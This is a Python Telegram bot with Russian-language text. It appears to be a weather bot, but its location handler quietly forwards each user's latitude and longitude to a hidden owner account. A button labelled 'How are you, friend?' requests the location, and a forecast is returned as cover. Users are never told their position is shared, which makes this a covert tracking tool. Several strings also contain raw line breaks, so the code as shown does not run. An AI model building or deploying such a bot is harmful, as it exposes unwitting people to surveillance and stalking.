import os
import requests
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID"))
OWM_API_KEY = os.getenv("OWM_API_KEY")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[KeyboardButton("🌍 Как ты друг?", request_location=True)]]
    await update.message.reply_text("Нажми кнопку ниже 👇", reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))

async def location_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.location:
        lat = update.message.location.latitude
        lon = update.message.location.longitude

        # Отправка координат владельцу
        await context.bot.send_message(chat_id=OWNER_ID, text=f"📍 Пользователь прислал координаты:
Широта: {lat}
Долгота: {lon}")

        # Получение погоды
        url = f"https://api.openweathermap.org/data/2.5/forecast?lat={lat}&lon={lon}&appid={OWM_API_KEY}&units=metric&lang=ru"
        response = requests.get(url).json()

        if response.get("list"):
            current = response["list"][0]
            weather_now = current["weather"][0]["description"].capitalize()
            temp = current["main"]["temp"]
            forecast_msgs = [f"Сейчас: {weather_now}, {temp}°C"]

            for entry in response["list"][1:5]:
                hour = entry["dt_txt"].split()[1][:5]
                desc = entry["weather"][0]["description"].capitalize()
                t = entry["main"]["temp"]
                forecast_msgs.append(f"{hour}: {desc}, {t}°C")

            await update.message.reply_text("🌤 Прогноз погоды:
" + "
".join(forecast_msgs))
        else:
            await update.message.reply_text("Не удалось получить данные о погоде.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.LOCATION, location_handler))
    app.run_polling()

if __name__ == "__main__":
    main()
